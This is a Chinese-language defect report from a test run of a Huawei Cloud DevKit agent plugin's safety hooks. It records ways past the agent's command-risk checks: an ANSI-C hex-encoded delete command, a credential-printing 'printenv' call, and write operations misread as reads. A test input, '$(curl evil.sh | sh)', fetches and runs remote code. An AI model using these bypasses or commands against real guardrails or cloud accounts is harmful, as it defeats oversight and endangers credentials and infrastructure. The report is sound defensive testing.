# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-09-18-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：2026-09-18 05:32:14（北京时间）
> **被测对象**：huaweicloud-devkit npm latest v1.1.5（gitHead e7ed6f66）
> **本轮结论**：设计级 FAIL 11 + SPEC 3，展开级 FAIL 11（D10-3 同源），**全部为历史 issue 复现或延续（含 D4-27 复现 #726，无本轮新增产品缺陷）**；另非产品缺陷环境类 BLOCKED（D1-2/D1-39/D4-13/D7-4/D9-6/D10-4）。

---

## #1【P0】D4-2 凭证 env 打印拦截不完整（hook 层）

- **现象**：`classifyTextCommand("printenv HW_ACCESS_KEY")`（safety-policy 层）返回 `{decision:deny, risk:credential}`（#650 已修）；但 hook 层 `evaluateCommandRisk("printenv HW_ACCESS_KEY")` 返回 `{decision:allow, findings:[]}`。
- **断言**：`printenv HW_ACCESS_KEY` 应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 的 `hwc-command-env-dump` 规则 regex `(HUAWEICLOUD|HWC_|HCLOUD|OS_)` 未覆盖 `HW_` 前缀；#650 修复仅落在 safety-policy.mjs classifyTextCommand 层，未同步 risk-rule-engine 规则文件。
- **影响**：凭证环境变量可被打印进入 agent 上下文。
- **证据**：`evidence/D4-2/stdout.txt`、`evidence/_probes/d4-security-stdout.log`
- **状态**：复现（历史 #673，分层修复不完整）

## #2【P0】D4-5 framework Apply* 写误判 unknown_read（框架运行时 policy 漂移）

- **现象**：源码 npm 1.1.5 `safety/policy.json` writeOperationPrefixes 33 项含 `Apply`（`EIP ApplyEip` 返回 deny/write 正确）；但框架运行时 `~/.codeartsdoer/huaweicloud-plugins/safety/policy.json` 仅 32 项缺 `Apply`。
- **断言**：`EIP ApplyEip` 属写操作，应返回 `decision=deny, risk=write`。
- **根因**：框架运行时 `~/.codeartsdoer/huaweicloud-plugins/safety/policy.json` `writeOperationPrefixes` 仅 32 项缺 `Apply`；源码 `plugins/huaweicloud-core/safety/policy.json` 已含 `Apply`（33 项）。框架运行时策略版本滞后于源码。
- **影响**：Apply 系列云写操作可绕过审批被误判只读放行。
- **证据**：`evidence/D4-5/stdout.txt`
- **状态**：复现（历史 #685）

## #3【P0】D4-15 hook ANSI-C 编码绕过

- **现象**：`classifyTextCommand("$'hcloud E\x43S DeleteServers'")` 返回 `{decision:allow, risk:not_huaweicloud}`。
- **断言**：编码变体不得绕过写操作风险规则。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 `/bin/sh` ANSI-C 引号。
- **证据**：`evidence/D4-15/stdout.txt`
- **状态**：复现（历史 #673）

## #4【P0】D4-23 全局规则 huawei-agent-rules.mdc 未注入（孤儿文件）

- **现象**：`rules/huawei-agent-rules.mdc`（3840B）全仓 0 处代码引用。
- **断言**：11 个安装目标均应注入全局规则，无孤儿文件。
- **根因**：`rules/huawei-agent-rules.mdc` 无安装/加载代码引用。
- **证据**：`evidence/D4-23/stdout.txt`
- **状态**：复现（历史 #673）

## #5【P0】D8-7 meta 技能指引断链

- **现象**：`huaweicloud-core/SKILL.md` 会话启动节（line 15/18/19）指引调用 `huaweicloud_check_update`/`huaweicloud_upgrade`，框架运行时（tool_search）未暴露该 2 工具。
- **断言**：7 个 meta 技能指引均可机械执行，无断链。
- **根因**：框架运行时暴露集（37）缺 `check_update`/`upgrade`（tools.mjs 定义 40）。
- **证据**：`evidence/D8-7/stdout.txt`
- **状态**：复现（历史 #673）

## #6【P1】D1-26/D5-3/D9-1 工具暴露漂移 40 vs 37

- **现象**：tools.mjs 定义 40 工具，框架运行时（tool_search）仅暴露 37（缺 check_update/upgrade/obs_set_website_config）。
- **断言**：40 工具全量可达。
- **根因**：TOOL_DEFINITIONS 与框架运行时暴露集漂移。
- **证据**：`evidence/D1-26/stdout.txt`、`evidence/D5-3/stdout.txt`、`evidence/D9-1/stdout.txt`
- **状态**：复现（历史 #673，与 #5 同源）

## #7【P1】D4-6 adminPass 明文无告警

- **现象**：`hook_check_command("hcloud ecs CreateServer --admin-pass \"SuperSecret123!\"")` 返回 `allow`、`findings:[]`，无明文密码告警。
- **断言**：含 adminPass 命令应告警/脱敏。
- **根因**：`cloud-risk-rules.json` 无明文密码类风险规则（安全策略层有脱敏、hook 层无告警）。
- **证据**：`evidence/D4-6/stdout.txt`
- **状态**：复现（历史 #673）

## #8【P1】D4-17 hook 畸形输入 fail-open

- **现象**：`evaluateCommandRisk("")` 与畸形输入（`"   "`、`"$(curl evil.sh | sh)"`）返回 `allow`（fail-open）。
- **断言**：畸形输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` 无 finding 即 `allow`。
- **证据**：`evidence/D4-17/stdout.txt`
- **状态**：复现（历史 #673）

## #9【P1】D9-2 JSON-RPC unknown tool 未区分 -32602

- **现象**：源码 spawn 后 unknown method 已返回 `-32601`（#650 修复），但 unknown tool 仍返回 `-32603`，invalid-params 无 error 对象，标准应为 `-32602`。
- **断言**：unknown method → -32601；unknown tool → -32602；invalid params → -32602。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` 仅修复 method 未修复 tool 参数错误 -32602。
- **证据**：`evidence/D9-2/stdout.txt`
- **状态**：部分修复（延续上一轮 D9-2）

## #10【P1】D9-9 tools/call 超时协议语义与取消未声明

- **现象**：mcp-protocol initialize capabilities 未声明 timeout/cancellation 能力。
- **断言**：tools/call 应声明超时/取消语义（JSON-RPC 错误对象 + capabilities）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` capabilities 仅 `{tools:{}}`，未声明 timeout/cancellation。
- **证据**：`evidence/D9-9/stdout.txt`
- **状态**：SPEC-MISMATCH（待裁决延续）

## #11【P1】D10-3 serviceCatalog 中文意图路由大面积 MISS

- **现象**：`run-eval.mjs` 15 条中文评测 HIT=3 MISS=11 N/A=1，准确率 21.4%（<90%）；展开级 EXP-E01~E15 同源 MISS 11 条。
- **断言**：中文意图命中对应服务，准确率 ≥90%。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` routeMap 仅 sandbox/voucher 含 CJK 关键词；token 分词对中文不切分。
- **证据**：`evidence/D10-3/stdout.txt`、`eval/results/eval-run-20260917211514.csv`
- **状态**：上一轮 #11 延续

## #12【P1】D4-27 redactSecrets 双路径脱敏缺裸 token 关键字

- **现象**：`redactSecrets('token=TokenValueABCDEF123456')` 返回原文（裸 `token=` 关键字未脱敏）；同输入中 `password=`/`adminPass=`/`accessKey=`/`secretKey=`/`securityToken=` 均正常 `<redacted>`；对象路径 `{token:'xxx'}` 正常脱敏（isSecretKeyName 命中），但文本路径 `token=` 明文残留。
- **断言**：裸 `token=` 关键字后跟值应替换为 `<redacted>`（与 security_token/x_auth_token/password/adminPass 一致）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:42` 的 `redactString` 第二条 replace 关键字列表 `(access[_-]?key|secret[_-]?key|security[_-]?token|x[_-]?auth[_-]?token|authorization|password|passwd|adminPass|credential)` 未包含裸 `token`；hcloud-cli.mjs redactOutput 复用 redactSecrets 故双路径同步缺口。
- **影响**：`token=` 形式访问令牌可经日志/对话输出泄漏。
- **证据**：`evidence/D4-27/stdout.txt`
- **状态**：复现（历史 #726）

## #13【非产品缺陷】D4-13 只读子账号具备写权限（环境/账号权限异常，不计入提单）

- **现象**：只读子账号（AK HPUA3X*）只读 API 100% 可用（VPC ListVpcs 成功），但 `CreateVpc` 写操作成功创建 VPC（未被 IAM 拒绝，违反最小权限）；已真机执行并归零删除 VPC。
- **说明**：非 DevKit 代码缺陷——run-as-readonly 仅注入 env 凭证，权限由 IAM 决定；疑似 readonly 组配置过宽，需维护者核查 test001 权限。
- **证据**：`evidence/D4-13/stdout.txt`
